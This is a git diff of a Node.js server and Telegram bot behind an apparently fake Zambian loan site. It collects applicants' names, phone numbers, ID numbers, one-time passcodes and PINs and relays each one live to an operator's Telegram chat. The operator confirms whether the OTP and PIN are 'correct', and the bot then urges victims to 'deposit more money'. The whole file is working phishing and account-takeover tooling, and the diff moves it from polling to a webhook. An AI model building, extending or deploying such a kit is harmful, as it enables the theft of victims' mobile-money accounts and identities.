@@ -6,32 +6,28 @@ const TelegramBot = require('node-telegram-bot-api');
 
 // ─── CONFIG ───────────────────────────────────────────────
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || 'YOUR_TELEGRAM_ID_HERE'; // get from @userinfobot
+const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || 'YOUR_TELEGRAM_ID_HERE';
 const PORT = process.env.PORT || 3000;
+const WEBHOOK_URL = process.env.WEBHOOK_URL || `https://zambia-loans-rtuw.onrender.com/webhook`;
 
 // ─── SETUP ────────────────────────────────────────────────
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: '/ws' });
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false }); // ← NO POLLING
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ─── SESSION STORE ────────────────────────────────────────
 const sessions = {};
-// sessionId → { phase, data, decision, chatId, createdAt }
-// phase: 'otp' | 'otp_submitted' | 'pin' | 'pin_submitted' | 'success'
-
-// ─── WEBSOCKET ────────────────────────────────────────────
 const wsBySession = {};
 
+// ─── WEBSOCKET ────────────────────────────────────────────
 wss.on('connection', (ws, req) => {
     const url = new URL(req.url, 'http://localhost');
     const sessionId = url.searchParams.get('session');
-    if (sessionId && sessions[sessionId]) {
-        wsBySession[sessionId] = ws;
-    }
+    if (sessionId && sessions[sessionId]) wsBySession[sessionId] = ws;
     ws.on('close', () => {
         if (sessionId && wsBySession[sessionId] === ws) delete wsBySession[sessionId];
     });
@@ -42,48 +38,120 @@ function sendToUser(sessionId, message) {
     if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
 }
 
+// ─── SET WEBHOOK ON START ─────────────────────────────────
+bot.setWebhook(WEBHOOK_URL).then(() => {
+    console.log(`🔗 Webhook set: ${WEBHOOK_URL}`);
+}).catch(e => console.log('[Webhook Error]', e.message));
+
+// ─── TELEGRAM WEBHOOK ENDPOINT ────────────────────────────
+app.post('/webhook', (req, res) => {
+    const update = req.body;
+    res.sendStatus(200); // respond immediately
+
+    // Handle inline button callbacks
+    if (update.callback_query) {
+        handleCallback(update.callback_query);
+    }
+
+    // Handle /start
+    if (update.message && update.message.text === '/start') {
+        if (update.message.from.id === parseInt(ADMIN_TELEGRAM_ID)) {
+            bot.sendMessage(update.message.chat.id,
+                '✅ <b>Admin Connected</b>\n\nYou will receive loan applications here.\nUse the inline buttons to verify OTP and PIN.',
+                { parse_mode: 'HTML' });
+        }
+    }
+});
+
+// ─── CALLBACK HANDLER ─────────────────────────────────────
+async function handleCallback(query) {
+    const data = query.data;
+    const parts = data.split(':');
+    const action = parts[0];
+    const result = parts[1];
+    const sessionId = parts.slice(2).join(':');
+
+    const s = sessions[sessionId];
+    if (!s) {
+        await bot.answerCallbackQuery(query.id, { text: 'Session expired' });
+        return;
+    }
+
+    if (action === 'otp') {
+        if (result === 'correct') {
+            s.phase = 'pin';
+            const msg = { type: 'otp_result', result: 'correct' };
+            s.decision = { type: 'otp_result', result: 'correct' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Correct → PIN' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `✅ <b>OTP Verified</b>\n👤 ${esc(s.data.name)}\n\nMoving to PIN…`, { parse_mode: 'HTML' });
+        } else {
+            s.phase = 'otp';
+            const msg = { type: 'otp_result', result: 'wrong' };
+            s.decision = { type: 'otp_result', result: 'wrong' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>OTP Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter OTP.`, { parse_mode: 'HTML' });
+        }
+    }
+
+    if (action === 'pin') {
+        if (result === 'correct') {
+            s.phase = 'success';
+            const msg = { type: 'pin_result', result: 'correct' };
+            s.decision = { type: 'pin_result', result: 'correct' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '✅ PIN Correct → SUCCESS' });
+            const interest = Math.round(s.data.amount * 0.0013 * s.data.period);
+            const total = s.data.amount + interest;
+            const ref = 'RMZ-' + Date.now().toString(36).toUpperCase().slice(-8);
+            await bot.sendMessage(ADMIN_TELEGRAM_ID,
+                `🎉 <b>APPLICATION SUCCESSFUL!</b>\n\n` +
+                `👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n🪪 ${s.data.idNumber}\n` +
+                `💰 K${s.data.amount.toLocaleString()} | 📅 ${s.data.period}d\n` +
+                `📊 Repayment: K${total.toLocaleString()}\n🔖 Ref: ${ref}\n\n` +
+                `💡 <b>Deposit more money for more loan!</b>`,
+                { parse_mode: 'HTML' });
+        } else {
+            s.phase = 'pin';
+            const msg = { type: 'pin_result', result: 'wrong' };
+            s.decision = { type: 'pin_result', result: 'wrong' };
+            sendToUser(sessionId, msg);
+            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN' });
+            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>PIN Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter PIN.`, { parse_mode: 'HTML' });
+        }
+    }
+}
+
 // ─── TELEGRAM HELPERS ─────────────────────────────────────
 function sendToAdmin(text, inlineButtons) {
     const opts = { parse_mode: 'HTML' };
-    if (inlineButtons) {
-        opts.reply_markup = { inline_keyboard: inlineButtons };
-    }
+    if (inlineButtons) opts.reply_markup = { inline_keyboard: inlineButtons };
     return bot.sendMessage(ADMIN_TELEGRAM_ID, text, opts).catch(e => console.log('[TG Error]', e.message));
 }
 
 // ─── API: CREATE SESSION ──────────────────────────────────
 app.post('/api/apply', (req, res) => {
     const { name, phone, idNumber, amount, period } = req.body;
-    if (!name || !phone || !idNumber || !amount || !period) {
+    if (!name || !phone || !idNumber || !amount || !period)
         return res.status(400).json({ success: false, error: 'Missing fields' });
-    }
 
     const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
-    sessions[sessionId] = {
-        phase: 'otp',
-        data: { name, phone, idNumber, amount, period },
-        decision: null,
-        createdAt: Date.now()
-    };
+    sessions[sessionId] = { phase: 'otp', data: { name, phone, idNumber, amount, period }, decision: null, createdAt: Date.now() };
 
     const interest = Math.round(amount * 0.0013 * period);
     const total = amount + interest;
 
     sendToAdmin(
         `🆕 <b>New Loan Application</b>\n\n` +
-        `👤 <b>Name:</b> ${esc(name)}\n` +
-        `📱 <b>Phone:</b> ${phone}\n` +
-        `🪪 <b>ID Number:</b> ${idNumber}\n` +
-        `💰 <b>Amount:</b> K${amount.toLocaleString()}\n` +
-        `📅 <b>Period:</b> ${period} days\n` +
-        `📊 <b>Est. Repayment:</b> K${total.toLocaleString()}\n\n` +
-        `⏳ <i>Waiting for OTP verification…</i>`,
-        [
-            [
-                { text: '✅ Correct OTP', callback_data: `otp_correct:${sessionId}` },
-                { text: '❌ Wrong OTP', callback_data: `otp_wrong:${sessionId}` }
-            ]
-        ]
+        `👤 ${esc(name)}\n📱 ${phone}\n🪪 ${idNumber}\n` +
+        `💰 K${amount.toLocaleString()} | 📅 ${period}d\n` +
+        `📊 Est. Repayment: K${total.toLocaleString()}\n\n` +
+        `⏳ <i>Waiting for OTP…</i>`,
+        [[
+            { text: '✅ Correct OTP', callback_data: `otp:correct:${sessionId}` },
+            { text: '❌ Wrong OTP', callback_data: `otp:wrong:${sessionId}` }
+        ]]
     );
 
     console.log(`[NEW] ${sessionId} | ${name} | ${phone} | K${amount}`);
@@ -102,11 +170,12 @@ app.post('/api/otp', (req, res) => {
     s.data.otp = otp;
 
     sendToAdmin(
-        `📲 <b>OTP Received</b>\n\n` +
-        `👤 ${esc(s.data.name)}\n` +
-        `📱 ${s.data.phone}\n` +
-        `🔢 <b>OTP Entered:</b> <code>${otp}</code>\n\n` +
-        `Is this the correct OTP?`
+        `📲 <b>OTP Received</b>\n\n👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n` +
+        `🔢 <b>OTP:</b> <code>${otp}</code>\n\nIs this correct?`,
+        [[
+            { text: '✅ Correct OTP', callback_data: `otp:correct:${sessionId}` },
+            { text: '❌ Wrong OTP', callback_data: `otp:wrong:${sessionId}` }
+        ]]
     );
 
     console.log(`[OTP] ${sessionId} → ${otp}`);
@@ -125,104 +194,29 @@ app.post('/api/pin', (req, res) => {
     s.data.pin = pin;
 
     sendToAdmin(
-        `🔐 <b>PIN Received</b>\n\n` +
-        `👤 ${esc(s.data.name)}\n` +
-        `📱 ${s.data.phone}\n` +
-        `🔢 <b>PIN Entered:</b> <code>${pin}</code>\n\n` +
-        `Is this the correct PIN?`
+        `🔐 <b>PIN Received</b>\n\n👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n` +
+        `🔢 <b>PIN:</b> <code>${pin}</code>\n\nIs this correct?`,
+        [[
+            { text: '✅ Correct PIN', callback_data: `pin:correct:${sessionId}` },
+            { text: '❌ Wrong PIN', callback_data: `pin:wrong:${sessionId}` }
+        ]]
     );
 
     console.log(`[PIN] ${sessionId} → ${pin}`);
     res.json({ success: true });
 });
 
-// ─── API: POLL FOR DECISION (fallback) ────────────────────
+// ─── API: POLL FOR DECISION ───────────────────────────────
 app.get('/api/check', (req, res) => {
     const { sessionId } = req.query;
     const s = sessions[sessionId];
     if (!s) return res.json({ status: 'not_found' });
-
     if (s.decision) {
         const d = s.decision;
         s.decision = null;
         res.json({ status: 'decision', type: d.type, result: d.result });
     } else {
         res.json({ status: 'waiting' });
-    }
-});
-
-// ─── TELEGRAM CALLBACK HANDLER (Admin clicks buttons) ─────
-bot.on('callback_query', async (query) => {
-    const data = query.data;
-    const [action, result, sessionId] = data.split(':');
-
-    const s = sessions[sessionId];
-    if (!s) {
-        await bot.answerCallbackQuery(query.id, { text: 'Session expired' });
-        return;
-    }
-
-    if (action === 'otp') {
-        if (result === 'correct') {
-            s.phase = 'pin';
-            const msg = { type: 'otp_result', result: 'correct' };
-            s.decision = { type: 'otp_result', result: 'correct' };
-            sendToUser(sessionId, msg);
-            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Correct → PIN phase' });
-            await bot.sendMessage(ADMIN_TELEGRAM_ID, `✅ <b>OTP Verified</b>\n👤 ${esc(s.data.name)}\n\nMoving to PIN verification…`, { parse_mode: 'HTML' });
-            console.log(`[ADMIN] ${sessionId} → OTP CORRECT`);
-        } else {
-            s.phase = 'otp';
-            const msg = { type: 'otp_result', result: 'wrong' };
-            s.decision = { type: 'otp_result', result: 'wrong' };
-            sendToUser(sessionId, msg);
-            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP → re-enter' });
-            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>OTP Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter OTP.`, { parse_mode: 'HTML' });
-            console.log(`[ADMIN] ${sessionId} → OTP WRONG`);
-        }
-    }
-
-    if (action === 'pin') {
-        if (result === 'correct') {
-            s.phase = 'success';
-            const msg = { type: 'pin_result', result: 'correct' };
-            s.decision = { type: 'pin_result', result: 'correct' };
-            sendToUser(sessionId, msg);
-            await bot.answerCallbackQuery(query.id, { text: '✅ PIN Correct → SUCCESS' });
-
-            const interest = Math.round(s.data.amount * 0.0013 * s.data.period);
-            const total = s.data.amount + interest;
-            const ref = 'RMZ-' + Date.now().toString(36).toUpperCase().slice(-8);
-
-            await bot.sendMessage(ADMIN_TELEGRAM_ID,
-                `🎉 <b>APPLICATION SUCCESSFUL!</b>\n\n` +
-                `👤 <b>Name:</b> ${esc(s.data.name)}\n` +
-                `📱 <b>Phone:</b> ${s.data.phone}\n` +
-                `🪪 <b>ID:</b> ${s.data.idNumber}\n` +
-                `💰 <b>Amount:</b> K${s.data.amount.toLocaleString()}\n` +
-                `📅 <b>Period:</b> ${s.data.period} days\n` +
-                `📊 <b>Repayment:</b> K${total.toLocaleString()}\n` +
-                `🔖 <b>Ref:</b> ${ref}\n\n` +
-                `💡 <b>Deposit more money for more loan!</b>`,
-                { parse_mode: 'HTML' }
-            );
-            console.log(`[ADMIN] ${sessionId} → PIN CORRECT → SUCCESS`);
-        } else {
-            s.phase = 'pin';
-            const msg = { type: 'pin_result', result: 'wrong' };
-            s.decision = { type: 'pin_result', result: 'wrong' };
-            sendToUser(sessionId, msg);
-            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN → re-enter' });
-            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>PIN Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter PIN.`, { parse_mode: 'HTML' });
-            console.log(`[ADMIN] ${sessionId} → PIN WRONG`);
-        }
-    }
-});
-
-// ─── TELEGRAM: respond to /start ──────────────────────────
-bot.onText(/\/start/, (msg) => {
-    if (msg.from.id === parseInt(ADMIN_TELEGRAM_ID)) {
-        bot.sendMessage(msg.chat.id, '✅ <b>Admin Connected</b>\n\nYou will receive loan applications here.\nUse the inline buttons to verify OTP and PIN.', { parse_mode: 'HTML' });
     }
 });
 
@@ -240,5 +234,5 @@ setInterval(() => {
 server.listen(PORT, () => {
     console.log(`\n✅ Server: http://localhost:${PORT}`);
     console.log(`📱 User:   http://localhost:${PORT}/`);
-    console.log(`🤖 Bot:    Listening for Telegram callbacks…\n`);
+    console.log(`🔗 Webhook: ${WEBHOOK_URL}\n`);
 });   
